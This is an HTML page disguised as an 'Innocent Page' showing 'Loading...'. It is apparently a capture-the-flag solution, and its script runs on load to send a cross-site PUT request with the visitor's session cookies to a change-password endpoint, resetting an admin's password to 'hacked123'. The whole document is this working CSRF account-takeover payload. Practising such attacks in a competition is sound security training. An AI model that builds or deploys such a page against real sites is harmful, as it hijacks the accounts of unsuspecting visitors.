<!DOCTYPE html>
<html>
<head>
    <title>Innocent Page</title>
</head>
<body>
    <h1>Loading...</h1>
    
    <script>
        // This will execute when the admin bot visits your page
        fetch('https://jmacmbjf.web.ctf.uscybergames.com/api/change-password', {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: 'include', // This is crucial - includes session cookies
            body: JSON.stringify({
                new_password: 'hacked123'
            })
        })
        .then(response => {
            if (response.ok) {
                console.log('Password changed successfully');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
    </script>
</body>
</html>
